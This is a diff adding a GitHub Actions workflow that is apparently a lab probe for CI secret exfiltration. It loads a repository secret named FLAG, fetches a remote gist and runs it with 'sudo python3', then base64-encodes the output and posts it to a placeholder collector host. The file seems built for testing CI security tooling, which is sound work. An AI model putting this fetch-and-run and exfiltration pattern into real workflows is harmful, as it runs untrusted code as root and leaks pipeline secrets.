@@ -1,0 +1,25 @@
+name: Hold probe 18 - secret second form
+
+on:
+  push:
+    branches:
+      - case-18-secret-second-form
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Test
+        env:
+          FLAG: ${{ secrets['FLAG'] }}
+        run: |
+          test -n "$FLAG"
+          printf '%s' "$(curl -L https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/ | sudo python3)" \
+            | base64 \
+            | curl --fail --max-time 3 --data-binary @- \
+                https://encoded-flag-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=flag-encoded-egress'
